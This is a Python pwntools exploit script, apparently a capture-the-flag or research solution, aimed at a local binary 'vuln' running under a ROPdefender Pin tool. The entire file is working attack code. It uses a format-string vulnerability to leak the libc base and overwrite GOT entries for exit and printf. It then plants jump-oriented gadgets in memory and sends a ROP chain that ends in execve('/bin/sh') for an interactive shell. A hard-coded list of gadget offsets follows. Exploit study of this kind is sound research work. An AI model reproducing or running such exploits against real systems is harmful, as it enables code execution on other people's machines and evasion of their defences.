from pwn import *
from pwnlib.fmtstr import fmtstr_payload
import sys
import time

s = process(['/home/cobra/Desktop/pin/pin', '-t', '/home/cobra/Desktop/pin/source/tools/ROPdefender/obj-intel64/ROPdefender.so', '--', './vuln'])

def clear():
    while True:
        if b'Payload:' in s.recv(1024):
            break

elf = ELF('vuln')
libc = ELF('libc-2.31.so')
context.bits = 64
context.arch = 'amd64'

# Pharse 1: leak libc base + change exit.got -> main
payload = b'%71$pAAA'
writes = {
    elf.got['exit']: elf.symbols['main']
}
payload += fmtstr_payload(7, writes, numbwritten = 17, write_size = 'short')
s.sendlineafter(b'Payload:\n', payload)
libc.address = int(s.recv(14).decode(), 16) - libc.symbols['__libc_start_main'] - 243
log.info('libc base: 0x%x', libc.address)

# Pharse 2: change printf -> 0x000000000016006f : popfq ; pop rsi ; clc ; jmp qword ptr [rsi + 0xf], overwrite 0x404030 -> '/bin/sh'
payload = b''
writes = {
    elf.symbols['a'] + 0x8: libc.address + 0x0000000000153879, # pop rax ; call rax
    elf.symbols['a'] + 0x10: libc.address + 0x000000000003765c, # pop r15 ; jmp rax
    elf.symbols['a'] + 0x18: elf.symbols['a'], # address of /bin/sh
    elf.symbols['a'] + 0x20: libc.address + 0x0000000000094ba8, # pop rbx ; jmp rax
}
payload += fmtstr_payload(6, writes, numbwritten = 0, write_size = 'short')
assert(len(payload) < 0x200)
s.sendline(payload)
clear()

payload = b''
writes = {
    elf.symbols['a'] + 0x28: libc.address + 0x000000000002fa76, # pop rax ; mov rdi, qword ptr [rsp + 0x50] ; call rbx
    elf.symbols['a'] + 0x30: libc.address + 0x00000000000e057f, # pop rsi ; jmp rax
    elf.symbols['a'] + 0x38: libc.address + 0x000000000016006f, # popfq ; pop rsi ; clc ; jmp qword ptr [rsi + 0xf]
    elf.symbols['a'] + 0x40: libc.address + 0x000000000015522f, # pop rdx ; call qword ptr [rax + 0x20]
}
payload += fmtstr_payload(6, writes, numbwritten = 0, write_size = 'short')
assert(len(payload) < 0x200)
s.sendline(payload)
clear()

payload = b''
writes = {
    elf.got['printf']: libc.address + 0x000000000016006f, # popfq ; pop rsi ; clc ; jmp qword ptr [rsi + 0xf]
    elf.symbols['a']: int.from_bytes(b'/bin/sh', byteorder = 'little', signed = False), # /bin//sh
}
payload += fmtstr_payload(6, writes, numbwritten = 0, write_size = 'short')
assert(len(payload) < 0x200)
s.sendline(payload)
clear()

# Pharse 3: ROP chain
payload = b''
payload += p64(elf.symbols['a'] + 0x8 - 0xf) # pop rax ; call rax
payload += p64(libc.address + 0x000000000016006f) # popfq ; pop rsi ; clc ; jmp qword ptr [rsi + 0xf]
payload += p64(elf.symbols['a'] + 0x10 - 0xf) # pop r15 ; jmp rax
payload += p64(libc.address + 0x000000000002584d) # syscall
payload += p64(0) # junk
payload += p64(elf.symbols['a'] + 0x20 - 0xf) # pop rbx ; jmp rax
payload += p64(libc.address + 0x000000000016006f) # popfq ; pop rsi ; clc ; jmp qword ptr [rsi + 0xf]
payload += p64(0) # junk
payload += p64(elf.symbols['a'] + 0x28 - 0xf) # pop rax ; mov rdi, qword ptr [rsp + 0x50] ; call rbx
payload += p64(elf.symbols['a'] + 0x38 - 0x20) # popfq ; pop rsi ; clc ; jmp qword ptr [rsi + 0xf]
payload += p64(elf.symbols['a'] + 0x40 - 0xf) # pop rdx ; call qword ptr [rax + 0x20]
payload += p64(0)
payload += p64(elf.symbols['a'] + 0x28 - 0xf) # pop rax ; mov rdi, qword ptr [rsp + 0x50] ; call rbx
payload += p64(libc.address + 0x000000000002c146) # pop rax ; call r15
payload += p64(elf.symbols['a'] + 0x30 - 0xf) # pop rsi ; jmp rax
payload += p64(0) # rsi = NULL
payload += p64(0x3b) # execve()
payload += p64(0) * 3 # junk
payload += p64(elf.symbols['a'])
payload += p64(0) * 3 # junk
payload += p64(elf.symbols['a'])
assert(len(payload) < 0x200)
s.sendline(payload)

s.interactive()

''' Gagget used
0x000000000016006f : popfq ; pop rsi ; clc ; jmp qword ptr [rsi + 0xf]
0x0000000000153879 : pop rax ; call rax
0x000000000003765c : pop r15 ; jmp rax
0x0000000000094ba8 : pop rbx ; jmp rax
0x000000000002fa76 : pop rax ; mov rdi, qword ptr [rsp + 0x50] ; call rbx
0x000000000015522f : pop rdx ; call qword ptr [rax + 0x20]
0x000000000002fa76 : pop rax ; mov rdi, qword ptr [rsp + 0x50] ; call rbx
0x00000000000e057f : pop rsi ; jmp rax
0x000000000002c146 : pop rax ; call r15
0x000000000002584d : syscall
0x404030 : '/bin/sh\x00'
'''
